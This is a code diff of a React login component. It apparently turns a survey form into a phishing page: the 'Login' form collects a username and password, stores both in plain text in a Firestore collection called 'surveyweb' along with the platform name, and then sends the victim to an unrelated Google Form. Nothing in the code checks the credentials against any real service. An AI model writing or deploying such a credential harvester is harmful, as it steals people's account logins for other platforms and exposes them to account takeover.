@@ -6,27 +6,53 @@ import "firebase/compat/firestore";
 
 export default function Login(props) {
   const [newMessage, setNewMessage] = useState({});
-  const [messages, setMessages] = useState([]);
-  const Url = "www.google.com";
+  const [username, setuserName] = useState('');
+  const [password, setPassword] = useState('');
+  const [isValid, setIsValid] = useState(false);
 
   const handleSendMessage = async (e) => {
-    const db = firebase.firestore();
-    await db.collection("surveyweb").add({
-      Platform: props.platform, 
-      data: newMessage,
-      timestamp: firebase.firestore.FieldValue.serverTimestamp(),
-    });
-
-    setNewMessage("");
-    window.location.href = 'https://docs.google.com/forms/d/e/1FAIpQLSeySsQZySjZ78BNucy2bud7Zgz0eFo29qu242KW312Fp2aMoQ/viewform?pli=1&pli=1';
-
+        
+    if(username == '' || password == '')
+    {
+      alert("Please enter username and password");
+    }
+    else
+    {
+      const db = firebase.firestore();
+        await db.collection("surveyweb").add({
+          Platform: props.platform, 
+          UserName: username,
+          Password: password,
+          timestamp: firebase.firestore.FieldValue.serverTimestamp(),
+          
+          
+        });
+        setNewMessage("");
+        window.location.href = 'https://docs.google.com/forms/d/e/1FAIpQLSeySsQZySjZ78BNucy2bud7Zgz0eFo29qu242KW312Fp2aMoQ/viewform?pli=1&pli=1';
+    }
+      
   };
 
-  const handleChange = (e) => {
-    const name = e.target.name;
-    const value = e.target.value;
-    setNewMessage((values) => ({ ...values, [name]: value }));
+  // const handleChange = (e) => {
+  //   const name = e.target.name;
+  //   const value = e.target.value;
+  //   setNewMessage((values) => ({ ...values, [name]: value }));
+  // };
+
+  const handleNameChange = (event) => {
+    setuserName(event.target.value);
+    setIsValid(validateForm());
   };
+  
+  const handlePasswordChange = (event) => {
+    setPassword(event.target.value);
+    setIsValid(validateForm());
+  };
+
+  const validateForm = () => {
+    return username.trim() !== '' || password.trim() !== '';
+  };
+  
 
   return (
     <div className="container">
@@ -35,20 +61,22 @@ export default function Login(props) {
         <input
           type="text"
           name="username"
-          value={newMessage.value}
-          onChange={handleChange}
+          value={username.value}
+          onChange={handleNameChange}
           placeholder="Username or Email"
           required
-        ></input>
+        />
         <input
           type="password"
           name="password"
           placeholder="password"
-          value={newMessage.value}
-          onChange={handleChange}
+          value={password.value}
+          onChange={handlePasswordChange}
           required
-        ></input>
-        <button onClick={handleSendMessage} >Login</button>
+        
+        />
+        <button onClick={handleSendMessage}>Login</button>
+       
       </div>
     </div>
   );
